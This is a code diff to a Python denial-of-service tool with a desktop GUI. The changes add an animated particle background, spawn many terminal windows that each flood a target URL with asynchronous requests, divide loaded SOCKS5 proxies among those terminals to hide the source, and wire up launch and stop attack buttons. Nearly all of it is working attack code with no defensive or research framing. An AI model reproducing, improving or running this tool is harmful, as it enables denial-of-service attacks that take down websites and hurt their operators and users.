@@ -3,6 +3,7 @@ import requests
 import asyncio
 import aiohttp
 import random
+import math  # Add math import for particle calculations
 from bs4 import BeautifulSoup
 from datetime import datetime
 import time
@@ -22,6 +23,91 @@ import webbrowser
 
 # Initialize colorama for Windows compatibility
 init()
+
+class Particle:
+    def __init__(self, canvas, width, height):
+        self.canvas = canvas
+        self.width = width
+        self.height = height
+        self.size = random.randint(1, 3)  # Smaller particles for better effect
+        self.x = random.randint(0, width)
+        self.y = random.randint(0, height)
+        self.speed = random.uniform(0.2, 1.0)  # Slower movement
+        self.angle = random.uniform(0, 2 * math.pi)
+        self.color = random.choice([
+            "#1E90FF", "#00BFFF", "#87CEEB", "#4169E1",  # Blues
+            "#00FF00", "#32CD32", "#98FB98",  # Matrix-like greens
+            "#FF4444", "#FF6B6B"  # Accent reds
+        ])
+        self.alpha = random.uniform(0.1, 0.4)
+        self.pulse_direction = 1
+        self.pulse_speed = random.uniform(0.02, 0.05)
+        self.min_size = 1
+        self.max_size = 3
+        self.current_size = self.size
+        
+        # Create particle with glow effect
+        self.id = self.canvas.create_oval(
+            self.x, self.y,
+            self.x + self.size,
+            self.y + self.size,
+            fill=self.color,
+            stipple="gray50",
+            outline=self.color,  # Add outline for glow effect
+            width=1
+        )
+        
+        # Create glow effect
+        self.glow = self.canvas.create_oval(
+            self.x - 1, self.y - 1,
+            self.x + self.size + 2,
+            self.y + self.size + 2,
+            fill="",
+            outline=self.color,
+            width=1,
+            stipple="gray25"
+        )
+
+    def move(self):
+        # Update position
+        self.x += math.cos(self.angle) * self.speed
+        self.y += math.sin(self.angle) * self.speed
+        
+        # Randomly change direction slightly
+        self.angle += random.uniform(-0.1, 0.1)
+        
+        # Pulse size
+        self.current_size += self.pulse_direction * self.pulse_speed
+        if self.current_size > self.max_size:
+            self.pulse_direction = -1
+        elif self.current_size < self.min_size:
+            self.pulse_direction = 1
+
+        # Wrap around screen with smooth transition
+        if self.x < -self.size:
+            self.x = self.width + self.size
+        elif self.x > self.width + self.size:
+            self.x = -self.size
+        if self.y < -self.size:
+            self.y = self.height + self.size
+        elif self.y > self.height + self.size:
+            self.y = -self.size
+
+        # Update particle position with current size
+        self.canvas.coords(
+            self.id,
+            self.x, self.y,
+            self.x + self.current_size,
+            self.y + self.current_size
+        )
+        
+        # Update glow position
+        self.canvas.coords(
+            self.glow,
+            self.x - 1, self.y - 1,
+            self.x + self.current_size + 2,
+            self.y + self.current_size + 2
+        )
 
 # ASCII Art
 ASCII_ART = """
@@ -421,7 +507,7 @@ def cleanup_processes():
     except Exception as e:
         print(f"{Fore.RED}Failed to cleanup processes: {str(e)}{Style.RESET_ALL}")
 
-def spawn_attack_processes(url, num_requests, stealth_mode):
+def spawn_attack_terminals(url, num_requests, stealth_mode, use_proxy):
     script_path = os.path.abspath(__file__)
     child_pids = []
     
@@ -440,20 +526,6 @@ def spawn_attack_processes(url, num_requests, stealth_mode):
         except Exception as e:
             print(f"{Fore.RED}Failed to save proxy list: {str(e)}{Style.RESET_ALL}")
     
-    # Register cleanup function
-    atexit.register(cleanup_processes)
-    
-    # Handle signals gracefully
-    def signal_handler(signum, frame):
-        print("\nTerminating all processes...")
-        cleanup_processes()
-        if os.path.exists(PROXY_SHARE_FILE):
-            os.remove(PROXY_SHARE_FILE)
-        sys.exit(0)
-    
-    signal.signal(signal.SIGTERM, signal_handler)
-    signal.signal(signal.SIGINT, signal_handler)
-    
     # Create command with exact same settings including proxy settings
     base_cmd = f'python "{script_path}" --spawn-instance "{url}" {num_requests} {1 if stealth_mode else 0} {1 if use_proxy else 0}'
     
@@ -463,7 +535,7 @@ def spawn_attack_processes(url, num_requests, stealth_mode):
     for i in range(TOTAL_TERMINALS - 1):  # -1 because current terminal counts as one
         try:
             if os.name == 'nt':  # Windows
-                # Using 'start' command to create visible windows with specific title and run command
+                # Create visible window with specific title
                 cmd = f'start cmd /k "title DDOS Terminal {i+1}/{TOTAL_TERMINALS-1} && {base_cmd}"'
                 process = subprocess.Popen(
                     cmd,
@@ -476,20 +548,24 @@ def spawn_attack_processes(url, num_requests, stealth_mode):
                 time.sleep(0.2)  # Wait for the window to be created
                 for proc in psutil.process_iter(['pid', 'name', 'window_title']):
                     try:
-                        if proc.info['window_title'] and "DDOS Terminal" in proc.info['window_title']:
+                        if proc.info['window_title'] and f"DDOS Terminal {i+1}" in proc.info['window_title']:
                             if proc.pid not in child_pids:
                                 child_pids.append(proc.pid)
                     except:
                         continue
             else:  # Linux/Unix
                 process = subprocess.Popen(
-                    ['gnome-terminal', '--', 'python', script_path, '--spawn-instance', url, str(num_requests), str(1 if stealth_mode else 0), str(1 if use_proxy else 0)],
+                    ['gnome-terminal', '--', 'python', script_path, '--spawn-instance', url, 
+                     str(num_requests), str(1 if stealth_mode else 0), str(1 if use_proxy else 0)],
                     preexec_fn=os.setsid
                 )
                 child_pids.append(process.pid)
         except Exception as e:
             print(f"{Fore.RED}Failed to spawn terminal {i+1}: {str(e)}{Style.RESET_ALL}")
-        time.sleep(0.1)  # Small delay between spawns to prevent system overload
+        time.sleep(0.1)  # Small delay between spawns
+    
+    # Save process information
+    save_process_info(os.getpid(), child_pids)
     
     print(f"{Fore.GREEN}Spawned {TOTAL_TERMINALS-1} attack terminals{Style.RESET_ALL}")
     print(f"{Fore.YELLOW}Waiting 5 seconds before launching monitor...{Style.RESET_ALL}")
@@ -497,33 +573,33 @@ def spawn_attack_processes(url, num_requests, stealth_mode):
     # Wait 5 seconds before launching monitor
     time.sleep(5)
     
-    # Create monitor terminal last
-    try:
-        if os.name == 'nt':  # Windows
-            monitor_cmd = f'start cmd /k "title DDOS Monitor && python "{script_path}" --monitor"'
-            monitor_process = subprocess.Popen(monitor_cmd, shell=True)
-            child_pids.append(monitor_process.pid)
-        else:  # Linux/Unix
-            monitor_process = subprocess.Popen(['gnome-terminal', '--', 'python', script_path, '--monitor'])
-            child_pids.append(monitor_process.pid)
-        print(f"{Fore.GREEN}Monitor terminal launched{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"{Fore.RED}Failed to launch monitor: {str(e)}{Style.RESET_ALL}")
-    
-    # Save process information
-    save_process_info(os.getpid(), child_pids)
+    return child_pids
 
 # Function to split proxies for each terminal
 def get_terminal_proxies(all_proxies, terminal_number, total_terminals):
-    if not all_proxies:
+    if not all_proxies or not isinstance(all_proxies, list):
         return []
-    # Calculate slice size for each terminal
-    slice_size = len(all_proxies) // total_terminals
-    # Get start and end index for this terminal's proxy slice
-    start_idx = terminal_number * slice_size
-    end_idx = start_idx + slice_size if terminal_number < total_terminals - 1 else len(all_proxies)
-    # Return this terminal's proxy slice
-    return all_proxies[start_idx:end_idx]
+    
+    try:
+        # Ensure terminal_number is valid
+        terminal_number = max(0, min(terminal_number, total_terminals - 1))
+        
+        # Calculate slice size for each terminal (minimum 1)
+        slice_size = max(1, len(all_proxies) // total_terminals)
+        
+        # Get start and end index for this terminal's proxy slice
+        start_idx = terminal_number * slice_size
+        end_idx = start_idx + slice_size if terminal_number < total_terminals - 1 else len(all_proxies)
+        
+        # Ensure indices are within bounds
+        start_idx = min(start_idx, len(all_proxies))
+        end_idx = min(end_idx, len(all_proxies))
+        
+        # Return this terminal's proxy slice
+        return all_proxies[start_idx:end_idx] if start_idx < end_idx else []
+    except Exception as e:
+        print(f"{Fore.RED}Error distributing proxies: {str(e)}{Style.RESET_ALL}")
+        return []  # Return empty list on error
 
 # Main function to run concurrent attacks (optimized)
 async def flood(url, num_requests, stealth_mode, use_proxy, proxies):
@@ -554,35 +630,69 @@ async def flood(url, num_requests, stealth_mode, use_proxy, proxies):
         except:
             pass
     
-    # Split proxies for this terminal if using proxies
-    if use_proxy and proxies:
-        terminal_proxies = get_terminal_proxies(proxies, terminal_number, TOTAL_TERMINALS)
-        if terminal_proxies:
-            print(f"{Fore.CYAN}Using {len(terminal_proxies)} unique proxies for this terminal{Style.RESET_ALL}")
-            # Optimize connection settings for proxy mode
-            connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
-            timeout = aiohttp.ClientTimeout(total=3, connect=1)
-            client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
-        else:
-            print(f"{Fore.YELLOW}No proxies assigned to this terminal{Style.RESET_ALL}")
-            client_session = aiohttp.ClientSession()
+    # Initialize terminal_proxies
+    terminal_proxies = []
+    
+    # Load proxies based on whether this is a spawned instance or main process
+    if use_proxy:
+        try:
+            if is_spawned:
+                # Load proxies from shared file for spawned instances
+                if os.path.exists(PROXY_SHARE_FILE):
+                    try:
+                        with open(PROXY_SHARE_FILE, 'r') as f:
+                            all_proxies = json.load(f)
+                            if isinstance(all_proxies, list) and all_proxies:  # Verify we have a valid list
+                                terminal_proxies = get_terminal_proxies(all_proxies, terminal_number, TOTAL_TERMINALS)
+                                if terminal_proxies:
+                                    print(f"{Fore.GREEN}Successfully loaded {len(terminal_proxies)} proxies for terminal {terminal_number}{Style.RESET_ALL}")
+                                else:
+                                    print(f"{Fore.YELLOW}No proxies assigned to terminal {terminal_number}{Style.RESET_ALL}")
+                            else:
+                                print(f"{Fore.YELLOW}No valid proxies found in shared file{Style.RESET_ALL}")
+                    except json.JSONDecodeError:
+                        print(f"{Fore.RED}Error decoding proxy file{Style.RESET_ALL}")
+                    except Exception as e:
+                        print(f"{Fore.RED}Error loading proxies: {str(e)}{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.YELLOW}No proxy share file found{Style.RESET_ALL}")
+            else:
+                # Use provided proxies for main process
+                if isinstance(proxies, list) and proxies:  # Verify we have a valid list
+                    terminal_proxies = get_terminal_proxies(proxies, terminal_number, TOTAL_TERMINALS)
+                    if terminal_proxies:
+                        print(f"{Fore.GREEN}Successfully loaded {len(terminal_proxies)} proxies for main process{Style.RESET_ALL}")
+                    else:
+                        print(f"{Fore.YELLOW}No proxies assigned to main process{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.YELLOW}No valid proxies provided{Style.RESET_ALL}")
+        except Exception as e:
+            print(f"{Fore.RED}Failed to load proxies: {str(e)}{Style.RESET_ALL}")
+            terminal_proxies = []  # Reset to empty list on error
+
+    # Setup client session based on proxy availability
+    if terminal_proxies:
+        print(f"{Fore.CYAN}Using {len(terminal_proxies)} unique proxies for this terminal{Style.RESET_ALL}")
+        connector = aiohttp.TCPConnector(limit=None, ttl_dns_cache=300)
+        timeout = aiohttp.ClientTimeout(total=3, connect=1)
+        client_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
     else:
-        terminal_proxies = []
+        print(f"{Fore.YELLOW}No proxies assigned to this terminal{Style.RESET_ALL}")
         client_session = aiohttp.ClientSession()
     
     # Set batch size based on proxy usage
     current_batch_size = BATCH_SIZE_WITH_PROXY if terminal_proxies else BATCH_SIZE_NO_PROXY
     print(f"{Fore.CYAN}Using batch size: {current_batch_size} {'(with proxies)' if terminal_proxies else '(without proxies)'}{Style.RESET_ALL}\n")
 
-    # Only spawn additional processes if this is the main instance
-    if not is_spawned:
-        spawn_attack_processes(url, num_requests, stealth_mode)
+    # Only spawn additional processes if this is the main instance and we're not in GUI mode
+    if not is_spawned and not any('--gui-mode' in arg for arg in sys.argv):
+        spawn_attack_terminals(url, num_requests, stealth_mode, use_proxy)
 
     try:
         async with client_session as session:
             tasks = []
             for i in range(num_requests):
-                # Use terminal's specific proxy subset
+                # Only use proxy if we have proxies available
                 proxy = random.choice(terminal_proxies) if terminal_proxies else None
                 task = asyncio.create_task(attack(url, session, stealth_mode, proxy))
                 tasks.append(task)
@@ -980,6 +1090,7 @@ async def run_monitor_terminal():
         except KeyboardInterrupt:
             break
         except Exception as e:
+            print(f"{Fore.RED}Monitor error: {str(e)}{Style.RESET_ALL}")
             await asyncio.sleep(MONITOR_UPDATE_INTERVAL)
 
 class CytzeroGUI:
@@ -1000,9 +1111,203 @@ class CytzeroGUI:
         self.use_proxy = tk.BooleanVar(value=False)
         self.proxy_count = tk.StringVar(value="0")
         self.attack_running = False
+        self.proxies = []  # Initialize proxies list
+        self.child_pids = []  # Store child PIDs
+        
+        # Register cleanup on window close
+        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
+        
+        # Register signal handlers in main thread
+        signal.signal(signal.SIGTERM, self.signal_handler)
+        signal.signal(signal.SIGINT, self.signal_handler)
+        
+        # Create and setup background canvas
+        self.setup_background()
         
         self.create_gui()
         
+        # Start animation
+        self.animate_background()
+        
+    def signal_handler(self, signum, frame):
+        self.cleanup_attack()
+        self.root.quit()
+
+    def on_closing(self):
+        self.cleanup_attack()
+        self.root.quit()
+
+    def run_attack(self, url, num_requests, stealth_mode, use_proxy, stop_event):
+        try:
+            # Run the attack in the current process
+            asyncio.run(flood(
+                url=url,
+                num_requests=num_requests,
+                stealth_mode=stealth_mode,
+                use_proxy=use_proxy,
+                proxies=self.proxies if use_proxy else []
+            ))
+        except Exception as e:
+            print(f"{Fore.RED}Error in attack: {str(e)}{Style.RESET_ALL}")
+        finally:
+            if not stop_event.is_set():
+                self.cleanup_attack()
+
+    def start_attack(self):
+        if not self.url.get():
+            messagebox.showerror("Error", "Please enter a target URL first!")
+            return
+            
+        if self.attack_running:
+            messagebox.showinfo("Info", "Attack is already running!")
+            return
+            
+        try:
+            num_requests = int(self.num_requests.get())
+        except ValueError:
+            messagebox.showerror("Error", "Invalid number of threads!")
+            return
+        
+        # Set attack running flag
+        self.attack_running = True
+        self.status_label.configure(text="Starting attack...")
+        
+        # Create a stop event for the attack
+        self.stop_event = threading.Event()
+        
+        # Add --gui-mode to sys.argv to prevent double spawning
+        if '--gui-mode' not in sys.argv:
+            sys.argv.append('--gui-mode')
+        
+        # Start background terminals
+        try:
+            # Spawn terminals and store child PIDs
+            self.child_pids = spawn_attack_terminals(
+                self.url.get(),
+                num_requests,
+                self.stealth_mode.get(),
+                self.use_proxy.get()
+            )
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to start attack terminals: {str(e)}")
+            self.cleanup_attack()
+            return
+        
+        # Start main attack thread
+        self.attack_thread = threading.Thread(
+            target=self.run_attack,
+            args=(
+                self.url.get(),
+                num_requests,
+                self.stealth_mode.get(),
+                self.use_proxy.get(),
+                self.stop_event
+            )
+        )
+        self.attack_thread.daemon = True
+        self.attack_thread.start()
+        
+        # Change attack button to stop button
+        self.attack_button.configure(
+            text="🛑 Stop Attack",
+            command=self.stop_attack,
+            fg_color="#CC0000",
+            hover_color="#AA0000"
+        )
+
+    def cleanup_attack(self):
+        if hasattr(self, 'stop_event'):
+            self.stop_event.set()
+        
+        # Kill all child processes
+        for pid in self.child_pids:
+            try:
+                kill_process_tree(pid)
+            except:
+                pass
+        
+        # Reset GUI state
+        self.attack_running = False
+        self.child_pids = []
+        self.progress_bar.set(0)
+        self.status_label.configure(text="Ready")
+        
+        # Reset attack button
+        self.attack_button.configure(
+            text="🚀 Launch Attack",
+            command=self.start_attack,
+            fg_color="#FF3333",
+            hover_color="#CC0000"
+        )
+        
+        # Cleanup files
+        for file in [PROCESS_FILE, PROXY_SHARE_FILE, MONITOR_FILE, MONITOR_TARGET_FILE]:
+            try:
+                if os.path.exists(file):
+                    os.remove(file)
+            except:
+                pass
+
+    def run(self):
+        self.root.mainloop()
+
+    def setup_background(self):
+        # Create background canvas with gradient
+        self.bg_canvas = tk.Canvas(
+            self.root,
+            width=800,
+            height=600,
+            bg="#0a0a0a",  # Darker background
+            highlightthickness=0
+        )
+        self.bg_canvas.place(x=0, y=0, relwidth=1, relheight=1)
+        
+        # Create gradient background
+        for i in range(600):
+            color = f"#{10-i//100:02x}{10-i//100:02x}{12-i//100:02x}"
+            self.bg_canvas.create_line(0, i, 800, i, fill=color)
+        
+        # Initialize connections list
+        self.connections = []
+        
+        # Create particles
+        self.particles = []
+        for _ in range(50):  # More particles
+            self.particles.append(Particle(self.bg_canvas, 800, 600))
+
+    def draw_connections(self):
+        # Remove old connections
+        for line in self.connections:
+            self.bg_canvas.delete(line)
+        self.connections.clear()
+        
+        # Draw new connections between nearby particles
+        for i, p1 in enumerate(self.particles):
+            for p2 in self.particles[i+1:]:
+                dx = p1.x - p2.x
+                dy = p1.y - p2.y
+                distance = math.sqrt(dx*dx + dy*dy)
+                
+                if distance < 100:  # Maximum distance for connection
+                    # Calculate opacity based on distance
+                    opacity = int((1 - distance/100) * 255)
+                    color = f"#{opacity:02x}{opacity:02x}{opacity:02x}"
+                    
+                    line = self.bg_canvas.create_line(
+                        p1.x + p1.size/2, p1.y + p1.size/2,
+                        p2.x + p2.size/2, p2.y + p2.size/2,
+                        fill=color,
+                        width=1,
+                        stipple="gray50"
+                    )
+                    self.connections.append(line)
+    
+    def animate_background(self):
+        for particle in self.particles:
+            particle.move()
+        self.draw_connections()  # Update connections
+        self.root.after(30, self.animate_background)  # Faster updates for smoother animation
+
     def create_gui(self):
         # Create main frame
         main_frame = ctk.CTkFrame(self.root)
@@ -1079,7 +1384,7 @@ class CytzeroGUI:
         ).pack()
         
         # Attack Button
-        attack_button = ctk.CTkButton(
+        self.attack_button = ctk.CTkButton(
             right_frame,
             text="🚀 Launch Attack",
             command=self.start_attack,
@@ -1088,7 +1393,7 @@ class CytzeroGUI:
             fg_color="#FF3333",
             hover_color="#CC0000"
         )
-        attack_button.pack(fill="x", padx=10, pady=20)
+        self.attack_button.pack(fill="x", padx=10, pady=20)
         
         # Status Frame
         self.status_frame = ctk.CTkFrame(main_frame)
@@ -1116,74 +1421,20 @@ class CytzeroGUI:
             font=("Helvetica", 10)
         )
         credits_label.pack()
-        
+
     def load_proxies_gui(self):
+        """Load proxies from sock5.txt file and update GUI"""
         loaded_proxies = load_proxies_from_file()
         if loaded_proxies:
+            self.proxies = loaded_proxies  # Store loaded proxies
             self.proxy_count.set(f"Loaded Proxies: {len(loaded_proxies)}")
+            self.use_proxy.set(True)  # Automatically enable proxy mode
             messagebox.showinfo("Success", f"Successfully loaded {len(loaded_proxies)} proxies!")
         else:
+            self.proxies = []  # Reset proxies if loading failed
+            self.proxy_count.set("Loaded Proxies: 0")
+            self.use_proxy.set(False)  # Disable proxy mode
             messagebox.showerror("Error", "Failed to load proxies from sock5.txt")
-    
-    def update_progress(self, progress):
-        self.progress_bar.set(progress / 100)
-        self.status_label.configure(text=f"Progress: {progress:.1f}%")
-        self.root.update()
-    
-    def start_attack(self):
-        if not self.url.get():
-            messagebox.showerror("Error", "Please enter a target URL first!")
-            return
-            
-        if self.attack_running:
-            messagebox.showinfo("Info", "Attack is already running!")
-            return
-            
-        try:
-            num_requests = int(self.num_requests.get())
-        except ValueError:
-            messagebox.showerror("Error", "Invalid number of threads!")
-            return
-            
-        # Start attack in a separate thread
-        self.attack_running = True
-        attack_thread = threading.Thread(
-            target=self.run_attack,
-            args=(
-                self.url.get(),
-                num_requests,
-                self.stealth_mode.get(),
-                self.use_proxy.get()
-            )
-        )
-        attack_thread.daemon = True
-        attack_thread.start()
-    
-    def run_attack(self, url, num_requests, stealth_mode, use_proxy):
-        try:
-            # Create event loop for asyncio
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            
-            # Run the flood function
-            loop.run_until_complete(
-                flood(
-                    url,
-                    num_requests,
-                    stealth_mode,
-                    use_proxy,
-                    proxies if use_proxy else []
-                )
-            )
-        except Exception as e:
-            messagebox.showerror("Error", f"Attack failed: {str(e)}")
-        finally:
-            self.attack_running = False
-            self.progress_bar.set(0)
-            self.status_label.configure(text="Ready")
-    
-    def run(self):
-        self.root.mainloop()
 
 # Update the main function to use GUI
 if __name__ == "__main__":
@@ -1197,9 +1448,20 @@ if __name__ == "__main__":
                 num_requests = int(sys.argv[3])
                 stealth_mode = bool(int(sys.argv[4]))
                 use_proxy = bool(int(sys.argv[5])) if len(sys.argv) > 5 else False
+                
+                # Load proxies from shared file if using proxies
+                proxies = []
+                if use_proxy and os.path.exists(PROXY_SHARE_FILE):
+                    try:
+                        with open(PROXY_SHARE_FILE, 'r') as f:
+                            proxies = json.load(f)
+                    except Exception as e:
+                        print(f"{Fore.RED}Failed to load proxies: {str(e)}{Style.RESET_ALL}")
+                
+                # Run the flood attack
                 asyncio.run(flood(url, num_requests, stealth_mode, use_proxy, proxies))
             except Exception as e:
-                print(f"Error in child process: {str(e)}")
+                print(f"{Fore.RED}Error in child process: {str(e)}{Style.RESET_ALL}")
                 sys.exit(1)
     else:
         # Start the GUI
